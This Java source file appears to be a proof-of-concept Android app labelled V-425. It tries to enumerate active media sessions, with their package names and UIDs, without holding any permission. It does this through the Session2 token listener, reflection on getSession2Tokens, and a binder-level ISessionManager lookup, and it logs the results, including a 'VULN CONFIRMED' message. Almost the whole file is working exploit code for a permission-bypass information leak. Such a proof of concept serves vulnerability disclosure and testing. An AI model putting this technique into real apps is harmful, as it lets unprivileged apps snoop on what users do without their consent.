package com.poc.mediasession2leak;

import android.app.Activity;
import android.media.session.MediaController;
import android.media.session.MediaSessionManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Bundle;
import android.os.Process;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;
import java.util.List;

/**
 * V-425: MediaSession2 Zero-Permission Token Enumeration
 *
 * addSession2TokensListener in MediaSessionService has NO permission check,
 * unlike addSessionsListener which requires MEDIA_CONTENT_CONTROL or NLS.
 * Any app can enumerate active media sessions (package names, UIDs, types).
 */
public class MainActivity extends Activity {

    private static final String TAG = "MediaSession2Leak";
    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-425: MediaSession2 Zero-Perm Enumeration");
        title.setTextSize(16);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("ZERO permissions. Tests if addSession2TokensListener "
                + "allows enumeration of active media sessions without "
                + "MEDIA_CONTENT_CONTROL or NLS.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        Button btn1 = new Button(this);
        btn1.setText("1. Try getActiveSessions (should FAIL)");
        btn1.setOnClickListener(v -> testGetActiveSessions());
        root.addView(btn1);

        Button btn2 = new Button(this);
        btn2.setText("2. Try Session2TokensListener (V-425)");
        btn2.setOnClickListener(v -> testSession2TokensListener());
        root.addView(btn2);

        Button btn3 = new Button(this);
        btn3.setText("3. Try getSession2Tokens reflection");
        btn3.setOnClickListener(v -> testGetSession2Tokens());
        root.addView(btn3);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== V-425: MediaSession2 Token Enumeration ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Permissions: NONE");
        log("");
    }

    private void testGetActiveSessions() {
        log("\n--- Test 1: getActiveSessions (protected, should fail) ---");
        try {
            MediaSessionManager msm = (MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE);
            List<MediaController> sessions = msm.getActiveSessions(null);
            log("[UNEXPECTED] Got " + sessions.size() + " sessions without NLS!");
            for (MediaController mc : sessions) {
                log("  Session: " + mc.getPackageName());
            }
        } catch (SecurityException e) {
            log("[EXPECTED] SecurityException: " + e.getMessage());
            log("  → getActiveSessions correctly requires NLS/MEDIA_CONTENT_CONTROL");
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testSession2TokensListener() {
        log("\n--- Test 2: addSession2TokensListener (V-425) ---");
        try {
            MediaSessionManager msm = (MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE);

            // Use reflection to call addSession2TokensListener
            // The public API is MediaSessionManager.addOnSession2TokensChangedListener
            Method addListener = MediaSessionManager.class.getMethod(
                    "addOnSession2TokensChangedListener",
                    MediaSessionManager.OnSession2TokensChangedListener.class);

            MediaSessionManager.OnSession2TokensChangedListener listener = tokens -> {
                log("[CALLBACK] Session2 tokens changed! Count: " + tokens.size());
                for (Object token : tokens) {
                    log("  Token: " + token.toString());
                }
            };

            addListener.invoke(msm, listener);
            log("[OK] addOnSession2TokensChangedListener succeeded!");
            log("  → NO SecurityException — zero-perm enumeration confirmed!");
            log("  → Waiting for callback with active session tokens...");

        } catch (SecurityException e) {
            log("[BLOCKED] SecurityException: " + e.getMessage());
        } catch (NoSuchMethodException e) {
            log("[INFO] Method not found, trying alternative...");
            testSession2TokensListenerAlt();
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testSession2TokensListenerAlt() {
        log("  Trying IMediaSessionService.addSession2TokensListener via reflection...");
        try {
            // Try the binder-level approach
            Object sessionService = getSystemService(Context.MEDIA_SESSION_SERVICE);
            Method getService = Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class);
            Object binder = getService.invoke(null, "media_session");

            if (binder != null) {
                log("  Got media_session binder: " + binder.getClass().getName());
                // Try to get the interface
                Class<?> stubClass = Class.forName("android.media.session.ISessionManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", android.os.IBinder.class);
                Object service = asInterface.invoke(null, binder);
                log("  Got ISessionManager: " + service.getClass().getName());

                // List methods
                for (Method m : service.getClass().getMethods()) {
                    if (m.getName().contains("ession2") || m.getName().contains("Token")) {
                        log("  Method: " + m.getName());
                    }
                }
            }
        } catch (Exception e) {
            log("  [ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void testGetSession2Tokens() {
        log("\n--- Test 3: getSession2Tokens via reflection ---");
        try {
            MediaSessionManager msm = (MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE);

            // Try getSession2Tokens method
            Method getTokens = null;
            for (Method m : msm.getClass().getMethods()) {
                if (m.getName().contains("Session2") || m.getName().contains("session2")) {
                    log("  Found method: " + m.getName() + " params=" + java.util.Arrays.toString(m.getParameterTypes()));
                    if (m.getName().equals("getSession2Tokens")) {
                        getTokens = m;
                    }
                }
            }

            if (getTokens != null) {
                Object result = getTokens.invoke(msm);
                if (result instanceof List) {
                    List<?> tokens = (List<?>) result;
                    log("[OK] getSession2Tokens returned " + tokens.size() + " tokens!");
                    for (Object token : tokens) {
                        log("  Token: " + token.toString());
                    }
                    if (!tokens.isEmpty()) {
                        log("\n[VULN CONFIRMED] Zero-perm media session enumeration!");
                    }
                }
            } else {
                log("[INFO] getSession2Tokens not found directly on MediaSessionManager");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
